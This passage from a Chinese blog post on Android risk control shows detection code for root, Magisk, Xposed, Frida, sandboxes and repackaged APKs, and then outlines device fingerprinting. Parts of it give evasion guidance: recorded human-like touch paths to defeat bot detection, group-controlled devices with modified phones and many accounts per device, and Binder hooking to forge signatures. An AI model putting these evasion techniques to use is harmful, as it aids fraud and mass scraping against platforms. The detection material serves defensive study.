（字面含义，正常用户使用的设备，服务端信任此设备）</li><li>灰产设备 （可能存在作弊可能的设备，当手机环境存在root等，hook框架等）</li><li>黑产设备 （已经被石锤作弊的设备）</li></ul><p>常用的环境检测主要包含以下几部分</p><h4 id="Root检测"><a href="#Root检测" class="headerlink" title="Root检测"></a>Root检测</h4><p><strong>传统检测方法：</strong>检测su文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var suPaths = [</span><br><span class="line">    &quot;/system/bin/su&quot;,</span><br><span class="line">    &quot;/system/xbin/su&quot;,</span><br><span class="line">    &quot;/sbin/su&quot;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><strong>现代检测方法：</strong>Magisk检测，LSPosed&#x2F;EdXposed检测，系统属性检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// 1. 检测Magisk特征文件</span><br><span class="line">var magiskPaths = [</span><br><span class="line">    &quot;/sbin/.magisk&quot;,</span><br><span class="line">    &quot;/data/adb/magisk&quot;,</span><br><span class="line">    &quot;/data/adb/modules&quot;,</span><br><span class="line">    &quot;/cache/magisk.log&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// 2. 检测Magisk端口（默认：随机端口）</span><br><span class="line">// Native层扫描 /proc/net/tcp</span><br><span class="line"></span><br><span class="line">// 3. 扫描/proc/self/maps内存映射</span><br><span class="line">function checkMapsForMagisk() &#123;</span><br><span class="line">    // 读取 /proc/self/maps</span><br><span class="line">    // 查找关键字：magisk, zygisk, riru</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 4. 检测/proc/self/mount挂载点</span><br><span class="line">function checkMountForMagisk() &#123;</span><br><span class="line">    // 检测tmpfs等可疑挂载</span><br><span class="line">&#125;</span><br><span class="line">// LSPosed 特征路径</span><br><span class="line">var lsposedPaths = [</span><br><span class="line">    &quot;/data/misc/lsposed&quot;,</span><br><span class="line">    &quot;/system/framework/lspatch.jar&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// 检测Zygote注入</span><br><span class="line">function checkZygoteHook() &#123;</span><br><span class="line">    // 检查 /proc/self/maps 是否包含 libriru.so</span><br><span class="line">    // 检查 /proc/[pid]/maps 中的可疑库</span><br><span class="line">&#125;</span><br><span class="line">// Java层</span><br><span class="line">String buildTags = Build.TAGS;</span><br><span class="line">boolean isTestKeys = buildTags.contains(&quot;test-keys&quot;); // 非官方ROM标志</span><br><span class="line"></span><br><span class="line">// Native层检测selinux状态</span><br><span class="line">// getenforce() == &quot;Permissive&quot; 表示可能被修改</span><br></pre></td></tr></table></figure><h4 id="Hook检测"><a href="#Hook检测" class="headerlink" title="Hook检测"></a>Hook检测</h4><p><strong>Xposed检测：</strong>上报Hook方法清单，检测Xposed环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// 扫描所有被Hook的方法</span><br><span class="line">public static List&lt;String&gt; getXposedHookedMethods() &#123;</span><br><span class="line">    List&lt;String&gt; hookedMethods = new ArrayList&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    // 遍历关键类的所有方法</span><br><span class="line">    Class&lt;?&gt; targetClass = YourClass.class;</span><br><span class="line">    for (Method method : targetClass.getDeclaredMethods()) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 检查方法是否包含Xposed桥接</span><br><span class="line">            Field fieldHookedMethod = </span><br><span class="line">                Method.class.getDeclaredField(&quot;artMethod&quot;);</span><br><span class="line">            fieldHookedMethod.setAccessible(true);</span><br><span class="line">            long artMethod = (long) fieldHookedMethod.get(method);</span><br><span class="line">            </span><br><span class="line">            // 分析ArtMethod结构，检测hook标志</span><br><span class="line">            // ...</span><br><span class="line">            </span><br><span class="line">        &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return hookedMethods;</span><br><span class="line">&#125;</span><br><span class="line">// 检测XposedBridge类</span><br><span class="line">try &#123;</span><br><span class="line">    Class.forName(&quot;de.robv.android.xposed.XposedBridge&quot;);</span><br><span class="line">    // 发现Xposed框架</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    // 未发现</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检测ClassLoader异常</span><br><span class="line">ClassLoader classLoader = YourClass.class.getClassLoader();</span><br><span class="line">String clName = classLoader.getClass().getName();</span><br><span class="line">if (clName.contains(&quot;XposedBridge&quot;)) &#123;</span><br><span class="line">    // 检测到Xposed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Frida检测：</strong>Inline Hook检测，Frida特征检测，检测常见Hook点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">// Native层实现</span><br><span class="line">#include &lt;elf.h&gt;</span><br><span class="line"></span><br><span class="line">// 1. 解析本地ELF文件获取原始指令</span><br><span class="line">uint32_t getOriginalInstruction(const char* soPath, </span><br><span class="line">                                  const char* funcName) &#123;</span><br><span class="line">    // 解析ELF文件</span><br><span class="line">    // 获取函数符号表</span><br><span class="line">    // 读取函数偏移处的指令</span><br><span class="line">    return originalInstruction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 2. 读取内存中的当前指令</span><br><span class="line">uint32_t getCurrentInstruction(void* funcAddr) &#123;</span><br><span class="line">    return *(uint32_t*)funcAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 3. 对比检测</span><br><span class="line">bool isFunctionHooked(const char* soPath, </span><br><span class="line">                       const char* funcName, </span><br><span class="line">                       void* funcAddr) &#123;</span><br><span class="line">    uint32_t original = getOriginalInstruction(soPath, funcName);</span><br><span class="line">    uint32_t current = getCurrentInstruction(funcAddr);</span><br><span class="line">    </span><br><span class="line">    if (original != current) &#123;</span><br><span class="line">        // 检测到Hook！</span><br><span class="line">        log(&quot;Function %s is hooked!&quot;, funcName);</span><br><span class="line">        log(&quot;Original: 0x%08x, Current: 0x%08x&quot;, original, current);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">// 检测Frida-server端口（默认27042）</span><br><span class="line">bool checkFridaPort() &#123;</span><br><span class="line">    FILE* fp = fopen(&quot;/proc/net/tcp&quot;, &quot;r&quot;);</span><br><span class="line">    // 扫描端口：27042, 27043等</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检测Frida线程</span><br><span class="line">bool checkFridaThread() &#123;</span><br><span class="line">    DIR* dir = opendir(&quot;/proc/self/task&quot;);</span><br><span class="line">    // 遍历线程，检查线程名：gmain, gdbus, gum-js-loop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检测Frida库文件</span><br><span class="line">const char* fridaLibs[] = &#123;</span><br><span class="line">    &quot;frida-agent&quot;,</span><br><span class="line">    &quot;frida-gadget&quot;, </span><br><span class="line">    &quot;libfrida&quot;,</span><br><span class="line">    &quot;re.frida&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 扫描 /proc/self/maps</span><br><span class="line">// 检查libc.so关键函数</span><br><span class="line">void* funcs[] = &#123;</span><br><span class="line">    dlopen,</span><br><span class="line">    dlsym,</span><br><span class="line">    open,</span><br><span class="line">    read,</span><br><span class="line">    write,</span><br><span class="line">    // ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; sizeof(funcs)/sizeof(void*); i++) &#123;</span><br><span class="line">    if (isFunctionHooked(&quot;libc.so&quot;, funcNames[i], funcs[i])) &#123;</span><br><span class="line">        // 上报被Hook的函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="沙箱-虚拟环境检测"><a href="#沙箱-虚拟环境检测" class="headerlink" title="沙箱&amp;虚拟环境检测"></a>沙箱&amp;虚拟环境检测</h4><p>进程环境检测，私有路径检测，文件描述符检测，IPC动态代理检测，Parent PID检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查启动时进程数量</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">checkProcessCount</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* fp = popen(<span class="string">&quot;ps -A&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), fp)) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常设备启动时进程数 &gt; 50</span></span><br><span class="line">    <span class="comment">// 沙箱环境可能只有几个进程</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="comment">// 可疑沙箱环境</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查应用私有目录</span></span><br><span class="line">String dataDir = getApplicationInfo().dataDir;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常路径: /data/data/com.example.app</span></span><br><span class="line"><span class="comment">// 沙箱路径: /data/data/com.virtualapp.xxx/virtual/data/com.example.app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dataDir.equals(<span class="string">&quot;/data/data/&quot;</span> + getPackageName())) &#123;</span><br><span class="line">    <span class="comment">// 检测到虚拟环境！</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检测异常的fd</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">checkFileDescriptors</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* dir = opendir(<span class="string">&quot;/proc/self/fd&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">char</span> fdPath[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">sprintf</span>(fdPath, <span class="string">&quot;/proc/self/fd/%s&quot;</span>, entry-&gt;d_name);</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> linkPath[<span class="number">256</span>];</span><br><span class="line">        <span class="type">ssize_t</span> len = readlink(fdPath, linkPath, <span class="keyword">sizeof</span>(linkPath)<span class="number">-1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否有异常的socket、pipe等</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(linkPath, <span class="string">&quot;virtualapp&quot;</span>) || </span><br><span class="line">            <span class="built_in">strstr</span>(linkPath, <span class="string">&quot;parallel&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 检测到沙箱特征</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检测系统服务是否被代理</span></span><br><span class="line">Object activityManager = context.getSystemService(</span><br><span class="line">    Context.ACTIVITY_SERVICE);</span><br><span class="line">    </span><br><span class="line">String className = activityManager.getClass().getName();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (className.contains(<span class="string">&quot;Proxy&quot;</span>) || </span><br><span class="line">    className.contains(<span class="string">&quot;$Proxy&quot;</span>) ||</span><br><span class="line">    className.contains(<span class="string">&quot;Hook&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 检测到动态代理！典型的VA特征</span></span><br><span class="line">    <span class="built_in">log</span>(<span class="string">&quot;IPC被代理: &quot;</span> + className);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测多个系统服务</span></span><br><span class="line">String[] services = &#123;</span><br><span class="line">    Context.ACTIVITY_SERVICE,</span><br><span class="line">    Context.PACKAGE_SERVICE,</span><br><span class="line">    Context.LOCATION_SERVICE,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 检查父进程</span></span><br><span class="line"><span class="type">pid_t</span> ppid = getppid();</span><br><span class="line"><span class="type">char</span> cmdline[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(cmdline, <span class="string">&quot;/proc/%d/cmdline&quot;</span>, ppid);</span><br><span class="line"></span><br><span class="line">FILE* fp = fopen(cmdline, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常情况下父进程是zygote</span></span><br><span class="line"><span class="comment">// 沙箱环境下可能是VA、Parallel Space等</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strstr</span>(cmdline, <span class="string">&quot;zygote&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">log</span>(<span class="string">&quot;异常父进程: %s&quot;</span>, cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>此字段一般在环境占比中很重要，当当前App环境一旦被石锤沙箱环境以后，直接可认定当前用户为黑设备</strong></p></blockquote><h4 id="APK签名检测"><a href="#APK签名检测" class="headerlink" title="APK签名检测"></a>APK签名检测</h4><p>检测签名信息，检测签名来源（Android 9+），Native层校验（防篡改），</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取APK签名</span></span><br><span class="line"><span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">    .getPackageInfo(context.getPackageName(), </span><br><span class="line">                    PackageManager.GET_SIGNATURES);</span><br><span class="line"></span><br><span class="line">Signature[] signatures = packageInfo.signatures;</span><br><span class="line"><span class="type">String</span> <span class="variable">signMd5</span> <span class="operator">=</span> getMD5(signatures[<span class="number">0</span>].toByteArray());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与预置的正版签名对比</span></span><br><span class="line"><span class="type">String</span> <span class="variable">OFFICIAL_SIGN</span> <span class="operator">=</span> <span class="string">&quot;你的官方签名MD5&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!signMd5.equals(OFFICIAL_SIGN)) &#123;</span><br><span class="line">    <span class="comment">// 检测到重打包！</span></span><br><span class="line">    <span class="comment">// 这是黑产设备的石锤证据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Android P及以上</span></span><br><span class="line"><span class="type">PackageInfo</span> <span class="variable">info</span> <span class="operator">=</span> pm.getPackageInfo(packageName,</span><br><span class="line">    PackageManager.GET_SIGNING_CERTIFICATES);</span><br><span class="line"></span><br><span class="line"><span class="type">SigningInfo</span> <span class="variable">signingInfo</span> <span class="operator">=</span> info.signingInfo;</span><br><span class="line"><span class="keyword">if</span> (signingInfo.hasMultipleSigners()) &#123;</span><br><span class="line">    <span class="comment">// 多签名，可疑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 读取APK文件，计算hash</span></span><br><span class="line"><span class="comment">// 对比预埋的hash值</span></span><br><span class="line">bool <span class="title function_">verifyApkIntegrity</span><span class="params">()</span> &#123;</span><br><span class="line">    const <span class="type">char</span>* apkPath = <span class="string">&quot;/data/app/.../base.apk&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算APK的SHA256</span></span><br><span class="line">    <span class="type">char</span>* hash = calculateSHA256(apkPath);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对比预埋hash（加密存储）</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp(hash, OFFICIAL_HASH) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 被篡改</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h4><p>基础特征检测，CPU特征检测，传感器检测，硬件特征检测</p><h4 id="自定义ROM"><a href="#自定义ROM" class="headerlink" title="自定义ROM"></a>自定义ROM</h4><p>系统文件MD5检查，Build属性检测</p><h3 id="查杀分离"><a href="#查杀分离" class="headerlink" title="查杀分离"></a>查杀分离</h3><p>这个也是一种很重要的策略，主要就是<strong>当服务端或者命中风控</strong>以后，他不会及时封你的号，或者立刻给你号返回错误数据。</p><p>而是隔一段时间，可能是几个小时，也有可能是几天，这样做的好处防止你去不断地试探从而找到正确的检测规律。</p><p>防止攻击者不断试探的方式去获取正确的风控规则。规避风险。</p><h3 id="用户行为-心跳包上报"><a href="#用户行为-心跳包上报" class="headerlink" title="用户行为&amp;心跳包上报"></a>用户行为&amp;心跳包上报</h3><h4 id="检测原理："><a href="#检测原理：" class="headerlink" title="检测原理："></a>检测原理：</h4><p>一般大厂会使用这种方案，在一些SDK初始化以后会开启一个<code>socket</code>，tcp长连接，覆盖App整个生命周期，当用户进行点击的时候</p><p>对页面某个位置点击的时候会进行上报，后台可以很清楚的看到当前用户的点击路径。如果攻击者直接通过<strong>rpc或者算法还原接口破解</strong>的方式调用接口的话，就<strong>可能会存在心跳包遗漏的问题</strong>，当长时间无心跳以后，可能会直接认为当前IP是风险IP，从而实现封禁。</p><p>这个方法也是很好用的办法，可以通过AI等进行自动化的行为判断，等AI的模型和数据足够完善以后，即可实现，自动化判断自动化&amp;非自动化（人手点击）的判断。</p><p>比如某些的自动点击框架，如果只是为了业务去点击的话，是没有一些多余操作的，而我们们的手在屏幕不断滑动的时候是会产生很多用户路径，我们称之为<strong>随机路径</strong>。</p><h4 id="对抗原理"><a href="#对抗原理" class="headerlink" title="对抗原理"></a>对抗原理</h4><p>自动化点击脚本控制App+用户随机路径，自动化脚本控制App去实现自动化点击，防止心跳包和用户点击路径的遗漏。</p><p>需要添加随机路径，防止被AI检测出来自动化操作，添加随机路径也很简单，在不影响点击结果的情况下，仿人触摸随机对屏幕滑动。</p><p>（可以提前录制一些用户的操作流程，将数据保存到Json里面，在对屏幕进行dispatch事件分发的时候，采用真人点击的event即可）</p><blockquote><p>细节点：如何记录用户的点击行为？</p><p>手机屏幕好像是一个分发器，而屏幕的view是消费者。他可能选择消费这个事件，也可以选择抛出去，给下级view去消费。</p><p>但是事件只要被消费了就一定会走<code>view-&gt;ontouch();</code>方法，所以我们只需要<code>hook view的view-&gt;ontouch();</code> 方法，把参数1进行toString打印和保存即可。即可得到全部的的点击事件消费对象<code>objection</code>。</p></blockquote><h3 id="异常-行为埋点"><a href="#异常-行为埋点" class="headerlink" title="异常&amp;行为埋点"></a>异常&amp;行为埋点</h3><h4 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h4><p>指的是在某个页面进行埋点，只有触发某条请求或者打开某个页面的时候才会进行埋点上报。</p><blockquote><p><strong>举个case:</strong></p><p>当攻击者调用登入接口获取token的时候，正常肯定需要打开App的登入页面，而这个埋点是通过打开页面时候进行上报。</p><p><strong>如果攻击者只进行了调用登入接口，没有调用埋点接口，可能会导致当前请求缺少前置埋点。</strong>可能会导致数据被风控。</p></blockquote><p>埋点上报其实在风控里面发挥的作用还是很大的，正常用户从登入到查看个人信息，需要触发5个埋点信息。</p><p>但是攻击者只触发了1-2个埋点，则可认定当前用户存在作弊行为，可能存在脱机的嫌疑。会被直接标识成黑设备。</p><p>在后台看的话就是一些点点，而这些点就是不同的埋点信息，哪个点被点亮，哪个点没有被点亮，和正常的用户做一下对比，很容易就可以确认。</p><h4 id="对抗原理："><a href="#对抗原理：" class="headerlink" title="对抗原理："></a>对抗原理：</h4><p>同上</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>说了这么多总结一下，用上述的方法可以有效对抗，RPC，或者常规的自动点击，包括一些大批量的数据获取。</p><p>当账号数量足够多的时候（账号足够成熟，很多新号会有限制），并且满足一下条件的时候：</p><p><strong>群控+自动点击+用户点击随机路径+完善的改机软件+一机多号（设备够多无视），即可实现风控的对抗。</strong></p><p>当然还需要分析，一些账号的临界值，不同的数据可能触发的风控点也不一样。</p><p>比如有的数据单用户日获取量不超过20条，那么你你就不可能获取超过20次。群控服务端还需要记录每个用户的日点击数，等信息。</p><h1 id="设备指纹获取"><a href="#设备指纹获取" class="headerlink" title="设备指纹获取"></a>设备指纹获取</h1><h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="Android-IPC代理"><a href="#Android-IPC代理" class="headerlink" title="Android IPC代理"></a>Android IPC代理</h3><p>Android本身是CS架构，客户端（client）服务端（server），我们常用的通过context上下文调用的API都是直接调用代理人的方式去调用的，而真正的服务端是ActivityManagerServer 简称，AMS， 他有很多代理，比如PackageManager，ActivityManager 等，这些都是AMS的<strong>代理人</strong>。而AMS就是<strong>被代理人</strong>。代理模式是一种设计模式，代理人可以提供被代理人的部分或者全部功能，实现代码封装，做鉴权，代码安全的角度，代理模式很常用的设计模式。</p><p>AMS和代理们通过Binder进行通讯，Binder是什么，有什么好处这里就不详细展开了，安卓面试八股文，可以理解成<strong>进程间通讯</strong>的东西，底层实现是<strong>通过共享内存，数据传输，读取速度更快</strong>。<strong>当我们调用代理人的API的时候，本质上是通过Binder去发送一些数据包，和AMS通讯</strong>，当<strong>AMS收到消息以后把结果在传输给对应的代理人</strong>。然后返回给调用方。在每个Manager里面都有一个代理人 。</p><p>之前很久之前有一种动态代理的技术，原理就是替换了里面的代理人，因为代理是一个接口，然后我们自己通过Proxy这个类创建一个代理，然后反射set回去，就可以实现常用的API拦截和Hook。类似VA的沙盒，对多开的App提供一份自己实现的代理，然后控制这些代理的返回值，以此实现沙盒相关操作。还有一种比较好的过APK签名的方法就是直接Hook”水管” 也就是hook binder的通讯的方法，当接收到指定事件以后，直接修改具体的结果，以此对Java层进行全量Hook(<strong>binder的通讯方法被Hook以后，调用者和代理人只能拿到被修改以后的结果，以此实现Java层的全量Hook</strong>，后面再讲签名验证的时候我在详细说。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常流程：App → 代理 → Binder → 系统服务 → 返回真实签名</span><br><span class="line">Hook后：App → 代理 → [被Hook的Binder] → 系统服务 → 真实签名</span><br><span class="line">                           ↓</span><br><span class="line">                      拦截并修改为伪造签名</span><br><span class="line">                           ↓</span><br><span class="line">         App ← 代理 ← [被Hook的Binder] ← 伪造签名返回</span><br></pre></td></tr></table></figure><h2 id="设备指纹-1"><a href="#设备指纹-1" class="headerlink" title="设备指纹"></a>设备指纹</h2><p>设备指纹主要分为三部分，<strong>Java层设备指纹，Native设备指纹</strong>，popen执行一些命令获取设备信息，包括<strong>一些核心的设备指纹</strong>。</p><h3 id="Java层设备指纹"><a href="#Java层设备指纹" class="headerlink" title="Java层设备指纹"></a>Java层设备指纹</h3><h4 id="Setting相关（重要）"><a href="#Setting相关（重要）" class="headerlink" title="Setting相关（重要）"></a>Setting相关（重要）</h4><h5 id="Get"><a href="#Get" class="headerlink" title="Get:"></a>Get:</h5><p>在<code>setting</code>里面大家经常遇到的可能就是<code>android id</code>的获取的</p><p><code>API</code>如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Settings.Secure.getString(context.getContentResolver(),Settings.Secure.ANDROID_ID)</span><br></pre></td></tr></table></figure><p>但是其实<code>Setting</code>里面还有很多别的功能东西，常见的就是<code>Settings.Secure</code> 和 <code>Settings.Global</code></p><p>在<code>Settings.Global</code> 里面其实还有一些别的字段，具体<code>API</code>如下。这些都是一些比较隐蔽的设备指纹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 